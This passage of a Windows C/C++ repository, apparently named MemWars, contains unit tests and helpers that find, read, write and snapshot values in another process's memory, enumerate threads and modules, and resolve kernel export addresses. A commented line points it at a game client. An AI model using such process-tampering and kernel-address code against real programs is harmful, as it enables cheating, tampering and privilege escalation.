        printf("FindValueInProcessTest() failed\n");
        goto Exit;
    }
    lastSize = matchingMemPtrs.size;
    FindValueInProcess(&testValue6, process, &matchingMemPtrs);
    if (lastSize >= matchingMemPtrs.size) {
        printf("FindValueInProcessTest() failed\n");
        goto Exit;
    }
    lastSize = matchingMemPtrs.size;
    FindValueInProcess(&testValue7, process, &matchingMemPtrs);
    if (lastSize >= matchingMemPtrs.size) {
        printf("FindValueInProcessTest() failed\n");
        goto Exit;
    }
    lastSize = matchingMemPtrs.size;
    FindValueInProcess(&testValue8, process, &matchingMemPtrs);
    if (lastSize >= matchingMemPtrs.size) {
        printf("FindValueInProcessTest() failed\n");
        goto Exit;
    }
    printf("FindValueInProcessTest() success\n");
    Exit:
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void ReadProcessMemoryAtPtrLocationTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    BYTEARRAY testValue;
    StrToByteArray(&testValue, "smallStr"); // make sure that this value actually is inside memoryTestApp.exe
    MEMPTRS matchingMemPtrs = {0};
    int lastSize = matchingMemPtrs.size;
    FindValueInProcess(&testValue, process, &matchingMemPtrs);
    if (lastSize >= matchingMemPtrs.size) {
        printf("ReadProcessMemoryAtPtrLocationTest()::FindValueInProcess() failed\n");
        goto Exit;
    }
    BYTEARRAY foundValue;
    BOOL success = ReadProcessMemoryAtPtrLocation(matchingMemPtrs.memPointerArray[0], testValue.size, process, &foundValue);
    if (!success) {
        printf("ReadProcessMemoryAtPtrLocationTest()::ReadProcessMemoryAtPtrLocation() failed\n");
        goto Exit;
    }
    // printf("%d, %d\n", foundValue.size, testValue.size);
    if (ValueIsMatching(&testValue, &foundValue)) {
        printf("ReadProcessMemoryAtPtrLocationTest() success\n");
    } else {
        printf("ReadProcessMemoryAtPtrLocationTest() failed\n");
    }
    Exit:
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void IntToByteArrayTest() {
    int testVal = 1337;
    BYTEARRAY bArr1;
    memcpy(bArr1.values, &testVal, sizeof(int));
    bArr1.size = sizeof(int);
    BYTEARRAY bArr;
    IntToByteArray(&bArr, testVal);
    if (ValueIsMatching(&bArr, &bArr1)) {
        printf("IntToByteArrayTest() success\n");
    } else {
        printf("IntToByteArrayTest() failed\n");
    }
}

void ShortToByteArrayTest() {
    short testVal = 137;
    BYTEARRAY bArr1;
    memcpy(bArr1.values, &testVal, sizeof(short));
    bArr1.size = sizeof(short);
    BYTEARRAY bArr;
    ShortToByteArray(&bArr, testVal);
    if (ValueIsMatching(&bArr, &bArr1)) {
        printf("ShortToByteArrayTest() success\n");
    } else {
        printf("ShortToByteArrayTest() failed\n");
    }
}

void ByteToByteArrayTest() {
    char testVal = 255;
    BYTEARRAY bArr1;
    memcpy(bArr1.values, &testVal, sizeof(char));
    bArr1.size = sizeof(char);
    BYTEARRAY bArr;
    ByteToByteArray(&bArr, testVal);
    if (ValueIsMatching(&bArr, &bArr1)) {
        printf("ByteToByteArrayTest() success\n");
    } else {
        printf("ByteToByteArrayTest() failed\n");
    }
}

void FloatToByteArrayTest() {
    float testVal = 2.859;
    BYTEARRAY bArr1 = {0};
    bArr1.size = sizeof(testVal);
    memcpy(bArr1.values, &testVal, sizeof(testVal));
    BYTEARRAY bArr = {0};
    FloatToByteArray(&bArr, testVal);
    if (ValueIsMatching(&bArr, &bArr1)) {
        printf("FloatToByteArrayTest() success\n");
    } else {
        printf("FloatToByteArrayTest() failed\n");
    }
}

void DoubleToByteArrayTest() {
    double testVal = 23.8591;
    BYTEARRAY bArr1 = {0};
    bArr1.size = sizeof(testVal);
    memcpy(bArr1.values, &testVal, sizeof(testVal));
    BYTEARRAY bArr = {0};
    DoubleToByteArray(&bArr, testVal);
    if (ValueIsMatching(&bArr, &bArr1)) {
        printf("DoubleToByteArrayTest() success\n");
    } else {
        printf("DoubleToByteArrayTest() failed\n");
    }
}


void StrToByteArrayTest() {
    const char* testString = "Test123";
    BYTEARRAY bArr1;
    memcpy(bArr1.values, testString, strlen("Test123"));
    bArr1.size = strlen("Test123");
    BYTEARRAY bArr;
    StrToByteArray(&bArr, testString);
    if (ValueIsMatching(&bArr, &bArr1) && bArr.size == strlen("Test123")) {
        printf("StrToByteArrayTest() success\n");
    } else {
        printf("StrToByteArrayTest() failed\n");
    }
}

void BytesToByteArrayTest() {
    BYTE arr[] = {0x0D, 0xE0, 0x0A, 0xD0, 0x0B, 0xE0, 0x0E, 0xF0};
    SIZE_T arrLen = 8;
    BYTEARRAY bArr1;
    memcpy(bArr1.values, arr, arrLen);
    bArr1.size = arrLen;
    BYTEARRAY bArr;
    BytesToByteArray(&bArr, arr, arrLen);
    if (ValueIsMatching(&bArr, &bArr1) && bArr.size == arrLen) {
        printf("BytesToByteArrayTest() success\n");
    } else {
        printf("BytesToByteArrayTest() failed\n");
    }
}



void ValueIsMatchingTest() {
    
    BYTEARRAY bArr;
    bArr.size = 4;
    bArr.values[0] = 0xA;
    bArr.values[1] = 0xB;
    bArr.values[2] = 0x0;
    bArr.values[3] = 0x4;

    BYTEARRAY bArr1;
    bArr1.size = 4;
    bArr1.values[0] = 0xA;
    bArr1.values[1] = 0xB;
    bArr1.values[2] = 0x0;
    bArr1.values[3] = 0x4;

    BYTEARRAY bArr2;
    bArr2.size = 4;
    bArr2.values[0] = 0x5;
    bArr2.values[1] = 0x1;
    bArr2.values[2] = 0x3;
    bArr2.values[3] = 0x4;

    if (ValueIsMatching(&bArr, &bArr1) == TRUE && ValueIsMatching(&bArr, &bArr2) == FALSE) {
        printf("ValueIsMatchingTest() success\n");
    } else {
        printf("ValueIsMatchingTest() failed\n");
    }
}

void ConcatMemPtrTest() {
    MEMPTRS memPtrs = {0};
    int testVal1 = 4;
    float testVal2 = 5;
    DWORD testVal3 = 7;
    double testVal4 = 1;
    BYTE testVal5 = 16;
    ConcatMemPtr(&testVal1, &memPtrs);
    ConcatMemPtr(&testVal2, &memPtrs);
    ConcatMemPtr(&testVal3, &memPtrs);
    ConcatMemPtr(&testVal4, &memPtrs);
    ConcatMemPtr((int*)&testVal5, &memPtrs);
    if (memPtrs.memPointerArray[0] == (BYTE*)&testVal1 &&
        memPtrs.memPointerArray[1] == (BYTE*)&testVal2 &&
        memPtrs.memPointerArray[2] == (BYTE*)&testVal3 &&
        memPtrs.memPointerArray[3] == (BYTE*)&testVal4 &&
        memPtrs.memPointerArray[4] == (BYTE*)&testVal5 &&
        memPtrs.size == 5) {
        printf("ConcatMemPtrTest() success\n");
    } else {
        printf("ConcatMemPtrTest() failed\n");
    }
}

void ReallocMemPtrsTest() {
    int testVal = 16;
    MEMPTRS memPtrs = {0};
    for (int i = 0; i < 101; i++) {
        ConcatMemPtr(&testVal, &memPtrs);
    }
    for (int i = 0; i < memPtrs.size; i++) {
        if (*(int*)*(memPtrs.memPointerArray + i) != 16) {
            printf("ReallocMemPtrsTest() failed\n");
            return;
        }
    }
    if (memPtrs.size == 101) {
        printf("ReallocMemPtrsTest() success\n");
    } else {
        printf("ReallocMemPtrsTest() failed\n");
    }
}

void ReallocMemoryMapTest() {
    MEMMAP memMap = {0};
    BYTEARRAY bArr;
    bArr.size = 4;
    bArr.values[0] = 0xA;
    bArr.values[1] = 0xB;
    bArr.values[2] = 0x0;
    bArr.values[3] = 0x4;
    int testVal = 16;
    for (int i = 0; i < 101; i++) {
        ConcatMemoryMap(&memMap, &testVal, &bArr);
    }
    for (int i = 0; i < memMap.size; i++) {
        if (!ValueIsMatching(memMap.byteArrays[i], &bArr) || 
            memMap.memPtrs->memPointerArray[i] != &testVal) {
            printf("ReallocMemoryMapTest() failed\n");
            return;
        }
    }
    
    if (memMap.size == 101 && memMap.memPtrs->size == 101) {
        printf("ReallocMemoryMapTest() success\n");
    } else {
        printf("ReallocMemoryMapTest() failed\n");
    }
    FreeMemMap(&memMap);
}

void ConcatMemoryMapTest() {
    MEMMAP memMap = {0};
    BYTEARRAY bArr;
    bArr.size = 4;
    bArr.values[0] = 0xA;
    bArr.values[1] = 0xB;
    bArr.values[2] = 0x0;
    bArr.values[3] = 0x4;
    BYTEARRAY bArr1;
    bArr1.size = 4;
    bArr1.values[0] = 0xA;
    bArr1.values[1] = 0xB;
    bArr1.values[2] = 0x0;
    bArr1.values[3] = 0x4;
    BYTEARRAY bArr2;
    bArr2.size = 4;
    bArr2.values[0] = 0x5;
    bArr2.values[1] = 0x1;
    bArr2.values[2] = 0x3;
    bArr2.values[3] = 0x4;
    int testVal1 = 1;
    int testVal2 = 5;
    int testVal3 = 50;
    ConcatMemoryMap(&memMap, &testVal1, &bArr);
    ConcatMemoryMap(&memMap, &testVal2, &bArr1);
    ConcatMemoryMap(&memMap, &testVal3, &bArr2);
    memMap.byteArrays[2]->values[0] = 0x1;
    if (ValueIsMatching(memMap.byteArrays[0], &bArr) &&
        ValueIsMatching(memMap.byteArrays[1], &bArr1) &&
        !ValueIsMatching(memMap.byteArrays[2], &bArr2) &&
        memMap.memPtrs->memPointerArray[0] == &testVal1 &&
        memMap.memPtrs->memPointerArray[1] == &testVal2 &&
        memMap.memPtrs->memPointerArray[2] == &testVal3 &&
        memMap.memPtrs->size == 3 &&
        memMap.size == 3) {
        
        printf("ConcatMemoryMapTest() success\n");
    } else {
        printf("ConcatMemoryMapTest() failed\n");
    }
    FreeMemMap(&memMap);
}

void getProcessBaseAddressTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    HMODULE hMod = GetProcessBaseAddress(process);

    if (hMod == NULL) {
        printf("getProcessBaseAddressTest() failed\n");
    } else {
        printf("getProcessBaseAddressTest() success\n");
    }
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void memorySnapshotMemCountMatchesPtrCountTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
        // process = (HANDLE)GetProcessByName("ac_client.exe");
    }
    MemorySnapshotToDisc(process, "buf.txt");
    FILE* file1 = fopen("buf.txt", "rb");
    if (file1 == NULL) {
        printf("Could not open buf.txt\n");
        printf("memorySnapshotMemCountMatchesPtrCountTest() failed\n");
        goto Exit;
    }
    

    FILE* file2 = fopen("buf.txt - ptrs", "rb");
    if (file2 == NULL) {
        printf("Could not open buf.txt - ptrs\n");
        printf("memorySnapshotMemCountMatchesPtrCountTest() failed\n");
        goto Exit;
    }
    
    int fileSize1;
    fseek(file1, 0 , SEEK_END);
    fileSize1 = ftell(file1);
    fseek(file1, 0, SEEK_SET);

    void* fileBuf1 = malloc(fileSize1 * 4);
    fread(fileBuf1, fileSize1, 1, file1);

    int fileSize2;
    fseek(file2, 0 , SEEK_END);
    fileSize2 = ftell(file2);
    fseek(file2, 0, SEEK_SET);

    void* fileBuf2 = malloc(fileSize2 * 4);
    fread(fileBuf2, fileSize2, 1, file2);

    if (fileSize1 == fileSize2/sizeof(void*)) {
        printf("memorySnapshotMemCountMatchesPtrCountTest() success\n");
    } else {
        printf("memorySnapshotMemCountMatchesPtrCountTest() failed\n");
    }

    fclose(file1);
    fclose(file2);
    Exit:
    system("del buf.txt");
    system("del \"buf.txt - ptrs\"");
    system("taskkill /IM memoryTestApp.exe /F >nul");
}


void memorySnapshotSavesCorrectValueAndPointerTest() {
    // this test makes a memory snapshot and tests if the saved pointers and
    // values correspond to the current pointers and values of the running program
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    MemorySnapshotToDisc(process, "buf.txt");

    MEMPTRS matchingPtrs = {0};
    BYTEARRAY testVal = {0};
    IntToByteArray(&testVal, 133337);
    FindValueInProcess(&testVal, process, &matchingPtrs);
    if (matchingPtrs.size == 0) {
        printf("memorySnapshotSavesCorrectValueAndPointerTest() failed. testVal not found\n");
        goto Exit;
    }

    FILE* file1 = fopen("buf.txt - ptrs", "rb");
    if (file1 == NULL) {
        printf("Could not open buf.txt - ptrs\n");
        printf("memorySnapshotSavesCorrectValueTest() failed\n");
        goto Exit;
    }

    FILE* file2 = fopen("buf.txt", "rb");
    if (file2 == NULL) {
        printf("Could not open buf.txt\n");
        printf("memorySnapshotSavesCorrectValueTest() failed\n");
        goto Exit;
    }

    int fileSize;
    fseek(file1, 0 , SEEK_END);
    fileSize = ftell(file1);
    fseek(file1, 0, SEEK_SET);

    void* fileBuf1 = malloc(fileSize * sizeof(void*));
    fread(fileBuf1, fileSize, 1, file1);

    int fileSize2;
    fseek(file2, 0 , SEEK_END);
    fileSize2 = ftell(file2);
    fseek(file2, 0, SEEK_SET);

    void* fileBuf2 = malloc(fileSize2 * sizeof(void*));
    fread(fileBuf2, fileSize2, 1, file2);

    BOOL foundValInMemoryBySnapshotPtr = FALSE;
    BOOL foundValOnDisc = FALSE;
    for (unsigned int i = 0; i < fileSize; i += sizeof(void*)) {
        if (i + sizeof(void*) >= fileSize) {
            break;
        }
        
        for (int n = 0; n < matchingPtrs.size; n++) {
            BYTEARRAY filebufVal = {0};
            BYTEARRAY memPtrVal = {0};
            if (sizeof(void*) == sizeof(DWORD64)) {
                memcpy(filebufVal.values, (DWORD64*)fileBuf1 + i, sizeof(void*));
                memcpy(memPtrVal.values, (DWORD64*)matchingPtrs.memPointerArray + n, sizeof(void*));
            } else if (sizeof(void*) == sizeof(DWORD)) {
                memcpy(filebufVal.values, (DWORD*)fileBuf1 + i, sizeof(void*));
                memcpy(memPtrVal.values, (DWORD*)matchingPtrs.memPointerArray + n, sizeof(void*));
            } else {
                printf("memorySnapshotSavesCorrectValueAndPointerTest() failed. unsupported platform\n");
                goto Exit;
            }
            filebufVal.size = sizeof(void*);
            memPtrVal.size = sizeof(void*);

            if (ValueIsMatching(&filebufVal, &memPtrVal)) {
                BYTEARRAY buf = {0};
                

                if (sizeof(void*) == sizeof(DWORD64)) {
                    ReadProcessMemoryAtPtrLocation((void*)*(((DWORD64*)fileBuf1) + i), 4, process, &buf);
                } else if (sizeof(void*) == sizeof(DWORD)) {
                    // suppress size warning since we made sure that the size is correct
                    #pragma warning(push)
                    #pragma warning(disable: 4312)
                    ReadProcessMemoryAtPtrLocation((void*)*(((DWORD*)fileBuf1) + i), 4, process, &buf);
                    #pragma warning(pop)
                }
                if (ValueIsMatching(&testVal, &buf)) {
                    foundValInMemoryBySnapshotPtr = TRUE;
                }

                BYTEARRAY buf1 = {0};
                if (sizeof(void*) == sizeof(DWORD64)) {
                    memcpy(&buf1.values, ((DWORD64*)fileBuf2 + i/sizeof(void*)), sizeof(int));
                    buf1.size = sizeof(int);
                } else if (sizeof(void*) == sizeof(DWORD)) {
                    memcpy(&buf1.values, ((DWORD*)fileBuf2 + i/sizeof(void*)), sizeof(int));
                    buf1.size = sizeof(int);
                }
                if (ValueIsMatching(&testVal, &buf1)) {
                    foundValOnDisc = TRUE;
                }
            }
        }
    }
    if (foundValInMemoryBySnapshotPtr && foundValOnDisc) {
        printf("memorySnapshotSavesCorrectValueAndPointerTest() success\n");
    } else {
        printf("memorySnapshotSavesCorrectValueAndPointerTest() failed\n");
    }

    fclose(file1);
    fclose(file2);
    Exit:
    system("del buf.txt");
    system("del \"buf.txt - ptrs\"");
    system("taskkill /IM memoryTestApp.exe /F >nul");
}


void WriteProcessMemoryAtPtrLocationTest() {
    
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }

    MEMPTRS matchingPtrs = {0};
    BYTEARRAY testVal = {0};
    UintToByteArray(&testVal, 3254963271);
    FindValueInProcess(&testVal, process, &matchingPtrs);

    BYTEARRAY testVal1 = {0};
    UintToByteArray(&testVal1, 31111113);

    if (matchingPtrs.size == 0) {
        printf("WriteProcessMemoryAtPtrLocationTest() failed! Testvalue not in memory!\n");
        goto Exit;
    }

    for (int i = 0; i < matchingPtrs.size; i++) {
        WriteProcessMemoryAtPtrLocation(process, *(matchingPtrs.memPointerArray + i), testVal1.values, testVal1.size);
    }

    for (int i = 0; i < matchingPtrs.size; i++) {
        BYTEARRAY buf = {0};
        ReadProcessMemoryAtPtrLocation(*(matchingPtrs.memPointerArray + i), sizeof(unsigned int), process, &buf);
        if (!ValueIsMatching(&buf, &testVal1)) {
            printf("WriteProcessMemoryAtPtrLocationTest() failed\n");
            goto Exit;
        }
    }
    printf("WriteProcessMemoryAtPtrLocationTest() success\n");

    Exit:
    system("taskkill /IM memoryTestApp.exe /F >nul");
}



int main() {
    // printProcessMemory("test.txt - Editor");
    // printProcessMemory("Buddy Liste");

    // printf("%zu\n", sizeof(DWORD64*));
    
    ValueIsMatchingTest();
    ConcatMemPtrTest();
    ReallocMemPtrsTest();
    IntToByteArrayTest();
    ShortToByteArrayTest();
    ByteToByteArrayTest();
    StrToByteArrayTest();
    BytesToByteArrayTest();
    FloatToByteArrayTest();
    DoubleToByteArrayTest();
    FindValueInProcessTest();
    ReadProcessMemoryAtPtrLocationTest();
    getProcessBaseAddressTest();
    ReallocMemoryMapTest();
    ConcatMemoryMapTest();
    memorySnapshotMemCountMatchesPtrCountTest();
    memorySnapshotSavesCorrectValueAndPointerTest();
    WriteProcessMemoryAtPtrLocationTest();

    return 0;
}
```

`Core/MemWarsServicesCore.cpp`:

```cpp
#include <windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <Winternl.h>
#include <iostream>
#include <string>
#include "MemWarsServicesCore.h"

vector<DWORD> GetPIDsOfProcess(wstring targetProcessName) {
	vector<DWORD> pids;
	if (targetProcessName == L"") {
        return pids;
    }
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(entry);
	if (!Process32FirstW(snap, &entry)) {
		return pids;
	}
	do {
		if (wstring(entry.szExeFile) == targetProcessName) {
			pids.emplace_back(entry.th32ProcessID);
		}
	} while (Process32NextW(snap, &entry));
	return pids;
}

map<wstring, DWORD64> GetModulesNamesAndBaseAddresses(DWORD pid) {
	map<wstring, DWORD64> modsStartAddrs;
 
	if (!pid) {
        return modsStartAddrs;
    }
 
	HMODULE hMods[1024];
	DWORD cbNeeded;
	unsigned int i;
 
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (!hProcess) {
        return modsStartAddrs;
    }
 
	// Get a list of all the modules in this process
	if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
		CloseHandle(hProcess);
		return modsStartAddrs;
	}
 
	// Get each module's infos
	for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
		WCHAR szModName[MAX_PATH];
		if (!GetModuleFileNameExW(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
            // Get the full path to the module's file
			continue;
        }
		wstring modName = szModName;
		int pos = modName.find_last_of(L"\\");
		modName = modName.substr(pos + 1, modName.length());
 
		MODULEINFO modInfo;
		if (!GetModuleInformation(hProcess, hMods[i], &modInfo, sizeof(modInfo))) {
            continue;
        }
 
		DWORD64 baseAddr = (DWORD64)modInfo.lpBaseOfDll;
        modsStartAddrs[modName] = baseAddr;
	}
 
	// Release the handle to the process
	CloseHandle(hProcess);
	return modsStartAddrs;
}

vector<DWORD> GetTIDChronologically(DWORD pid) {
	map<ULONGLONG, DWORD> tidsWithStartTimes;
	vector<DWORD> tids;
 
	if (pid == NULL) {
        return tids;
    }
 
	DWORD dwMainThreadID = NULL;
	ULONGLONG ullMinCreateTime = MAXULONGLONG;
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap != INVALID_HANDLE_VALUE) {
		THREADENTRY32 th32;
		th32.dwSize = sizeof(THREADENTRY32);
		BOOL bOK = TRUE;
		for (bOK = Thread32First(hThreadSnap, &th32); bOK; bOK = Thread32Next(hThreadSnap, &th32)) {
			if (th32.th32OwnerProcessID == pid) {
				HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, th32.th32ThreadID);
				if (hThread) {
					FILETIME afTimes[4] = { 0 };
					if (GetThreadTimes(hThread, &afTimes[0], &afTimes[1], &afTimes[2], &afTimes[3])) {
						ULONGLONG ullTest = MAKEULONGLONG(afTimes[0].dwLowDateTime, afTimes[0].dwHighDateTime);
						tidsWithStartTimes[ullTest] = th32.th32ThreadID;
					}
					CloseHandle(hThread);
				}
			}
		}
		CloseHandle(hThreadSnap);
	}
 
	for (auto const& thread : tidsWithStartTimes) {
        // maps are natively ordered by key
		tids.push_back(thread.second);
    } 
 
	return tids;
}

map<DWORD, DWORD64> GetThreadsStartAddresses(vector<DWORD> tids) {
	map<DWORD, DWORD64> tidsStartAddresses;
 
	if (tids.empty()) {
        return tidsStartAddresses;
    }

	for (int i = 0; i < tids.size(); ++i) {
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tids[i]);
		PVOID startAddress = NULL;
		ULONG returnLength = NULL;
		NTSTATUS NtQIT = NtQueryInformationThread(hThread, (THREADINFOCLASS)ThreadQuerySetWin32StartAddress, &startAddress, sizeof(startAddress), &returnLength);
		CloseHandle(hThread);
		if (tids[i] && startAddress) {
            tidsStartAddresses[tids[i]] = (DWORD64)startAddress;
        }
	}
 
	return tidsStartAddresses;
}

map<DWORD, wstring> GetTIDsModuleStartAddr(DWORD pid) {
	map<DWORD, wstring> tidsStartModule;
 
	map<wstring, DWORD64> modsStartAddrs = GetModulesNamesAndBaseAddresses(pid);
	if (modsStartAddrs.empty()) {
        return tidsStartModule;
    }
 
	vector<DWORD> tids = GetTIDChronologically(pid);
	if (tids.empty()) {
        return tidsStartModule;
    }

	map<DWORD, DWORD64> tidsStartAddresses = GetThreadsStartAddresses(tids);
	if (tidsStartAddresses.empty()) {
        return tidsStartModule;
    }
 
	for (auto const& thisTid : tidsStartAddresses) {
		DWORD tid = thisTid.first;
		DWORD64 startAddress = thisTid.second;
		DWORD64 nearestModuleAtLowerAddrBase = 0;
		wstring nearestModuleAtLowerAddrName = L"";
		for (auto const& thisModule : modsStartAddrs) {
			wstring moduleName = thisModule.first;
			DWORD64 moduleBase = thisModule.second;
			if (moduleBase > startAddress) {
				continue;
			}
			if (moduleBase > nearestModuleAtLowerAddrBase) {
				nearestModuleAtLowerAddrBase = moduleBase;
				nearestModuleAtLowerAddrName = moduleName;
			}
		}
		if (nearestModuleAtLowerAddrBase > 0 && nearestModuleAtLowerAddrName != L"") {
			tidsStartModule[tid] = nearestModuleAtLowerAddrName;
		}
	}
 
	return tidsStartModule;
}


HANDLE GetProcessHandleByName(wstring name, DWORD access, BOOL inheritHandle) {
	vector<DWORD> pids = GetPIDsOfProcess(name);
	if (pids.empty()) {
		return NULL;
	}
	DWORD processID = pids[0];
    HANDLE hProc = OpenProcess(access, inheritHandle, processID);
    return hProc;
}


uint32_t FindProcess(const std::string& name) {
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(processSnapshot, &processEntry)) {
		do {
			if (!stricmp(processEntry.szExeFile, name.data())) {
				CloseHandle(processSnapshot);
				return processEntry.th32ProcessID;
			}
		}
		while (Process32Next(processSnapshot, &processEntry));
	}
	CloseHandle(processSnapshot);
	return 0;
}

HMODULE ntLib;
uint64_t ntBase;

BOOL InitKernelModuleInfo() {
	vector<BYTE> buffer(1024 * 1024);

	ULONG reqSize = 0;

	do {
		if (!NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer.data(), buffer.size(), &reqSize)) {
			break;
		}

		buffer.resize(reqSize * 2);
	}
	while (reqSize > buffer.size());

	SYSTEM_MODULE_INFORMATION* moduleInfo = (SYSTEM_MODULE_INFORMATION*)buffer.data();

	char* kernelFileName = (char*) moduleInfo->module[0].fullPathName + moduleInfo->module[0].offsetToFileName;

	ntBase = (uint64_t) moduleInfo->module[0].imageBase;
	ntLib = LoadLibraryA(kernelFileName);

	if (!ntBase || !ntLib) {
		// printf("Failed to get kernel module information!\n");
		return FALSE;
	}

	// printf("Kernel: %s @ %16llx\n", kernelFileName, ntBase);
	return TRUE;
}

```

`Core/MemWarsServicesCore.h`:

```h
#ifndef _MEM_WARS_SERVICES_H
#define _MEM_WARS_SERVICES_H

#include <Windows.h>
#include <inttypes.h>
// #include <winternl.h>
#include <vector>
#include <map>
#include <string>

using namespace std;

#ifndef MAKEULONGLONG
#define MAKEULONGLONG(ldw, hdw) ((ULONGLONG(hdw) << 32) | ((ldw) & 0xFFFFFFFF))
#endif

#define ThreadQuerySetWin32StartAddress 9

using fnFreeCall = uint64_t(__fastcall*)(...);

typedef struct _SYSTEM_MODULE_ENTRY {
	HANDLE section;
	PVOID mappedBase;
	PVOID imageBase;
	ULONG imageSize;
	ULONG flags;
	USHORT loadOrderIndex;
	USHORT initOrderIndex;
	USHORT loadCount;
	USHORT offsetToFileName;
	UCHAR fullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG count;
	SYSTEM_MODULE_ENTRY module[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

#define SystemModuleInformation 0xBull

vector<DWORD> GetPIDsOfProcess(wstring targetProcessName);
map<wstring, DWORD64> GetModulesNamesAndBaseAddresses(DWORD pid);
vector<DWORD> GetTIDChronologically(DWORD pid);
map<DWORD, DWORD64> GetThreadsStartAddresses(vector<DWORD> tids);
map<DWORD, wstring> GetTIDsModuleStartAddr(DWORD tid);
HANDLE GetProcessHandleByName(wstring name, DWORD access = PROCESS_ALL_ACCESS, BOOL inherit = FALSE);
uint32_t FindProcess(const std::string& name);
BOOL InitKernelModuleInfo();

extern HMODULE ntLib;
extern uint64_t ntBase;
static bool kernelModuleInitialized = FALSE;
template<typename T = fnFreeCall>
T GetKernelProcAddress(const char* proc) {
	if (!kernelModuleInitialized) {
		InitKernelModuleInfo();
		kernelModuleInitialized = TRUE;
	}
	FARPROC locProc = GetProcAddress(ntLib, proc);

	if (!locProc) {
		return (T) (nullptr);
	}

	uint32_t delta = (uintptr_t) (locProc) - (uintptr_t) (ntLib);

	return (T) (ntBase + delta);
}

#endif
```

`Core/buildMemWarsTest.bat`:

```bat
cl.exe MemWarsCoreTest.c MemWarsCore.c /link user32.lib Kernel32.lib Advapi32.lib
```

`Core/buildTestApp.bat`:

```bat
cl.exe memoryTestApp.c /link user32.lib kernel32.lib
```

`Core/memoryTestApp.c`:

```c
#include <windows.h>
#include <stdio.h>
#include <wchar.h>

int main(int argc, char* argv[]) {
    int value1 = 133337;
    int value2 = 0xB00B;
    long value3 = 0xCFFE;
    float value4 = 1.375;
    double value5 = 312.76493;
    unsigned int value6 = 3254963271;
    char* str1 = "smallStr";
    const char* str2 = "Can you find me too?";
    char str3[] = "And me??";
    wchar_t* str4 = L"Try finding wide chars...";
    
    if (argc > 1 && strstr(argv[1], "-window") != 0) {
        for (;;) {
            char msg[] = "The value is: xxxxx";
            sprintf(msg + strlen("The value is: "), "%d", value1);
            MessageBox(0, msg, "manipulateMe", MB_OK);
        }
    } else {
        for (;;) {
            // just wait to be manipulated
        }
    }
}
```

`LuaInterface/ConsoleColors.lua`:

```lua

local Colors = {}

function SetConsoleColor(color)
    local esc = string.char(27)
    os.execute("echo|set /p=" .. esc .. '[' .. color .. 'm')
end

Colors.SetConsoleColor = SetConsoleColor
Colors.red          = 31
Colors.green        = 32
Colors.white        = 37
Colors.default      = 39
Colors.black        = 90
Colors.brightred    = 91
Colors.brightgreen  = 92
Colors.magenta      = 95
Colors.cyan         = 96
Colors.brightwhite  = 97

return Colors
```

`LuaInterface/ConsoleInterface/ConsoleInterface.cpp`:

```cpp
#include <iostream>
#include <string>
#include <windows.h>
#include <vector>
#include "ConsoleInterface.h"
#include "../PenetrationRoutines/ValueFinder/ValueFinder.h"

using namespace std;

vector<BYTE> HexStringToBytes(string hexString) {
    vector<BYTE> bytes;
    for (unsigned int i = 0; i < hexString.length(); i += 2) {
        string byteString = hexString.substr(i, 2);
        char byte = (char) strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

BOOL RequestUserValueInput(void* value, SIZE_T& valSize) {
    cout << "Enter the value datatype:" << endl
    << "(1) Byte" << endl
    << "(2) 2 Bytes" << endl
    << "(3) 4 Bytes" << endl
    << "(4) 8 Bytes" << endl
    << "(5) Float" << endl
    << "(6) Double" << endl
    << "(7) String" << endl
    << "(8) Bytearray" << endl;
    string choice;
    cin >> choice;
    cout << "Enter value:" << endl;
    if (choice == "1") {
        BYTE b;
        cin >> b;
        memcpy(value, &b, sizeof(BYTE));
        valSize = sizeof(BYTE);
    } else if (choice == "2") {
        WORD w;
        cin >> w;
        memcpy(value, &w, sizeof(WORD));
        valSize = sizeof(WORD);

    } else if (choice == "3") {
        DWORD dw;
        cin >> dw;
        memcpy(value, &dw, sizeof(DWORD));
        valSize = sizeof(DWORD);

    } else if (choice == "4") {
        DWORD64 dw64;
        cin >> dw64;
        memcpy(value, &dw64, sizeof(DWORD64));
        valSize = sizeof(DWORD64);

    } else if (choice == "5") {
        float f;
        cin >> f;
        memcpy(value, &f, sizeof(float));
        valSize = sizeof(float);

    } else if (choice == "6") {
        double d;
        cin >> d;
        memcpy(value, &d, sizeof(double));
        valSize = sizeof(double);

    } else if (choice == "7") {
        string s;
        cin >> s;
        if (s.size() > MAX_VAL_SIZE) {
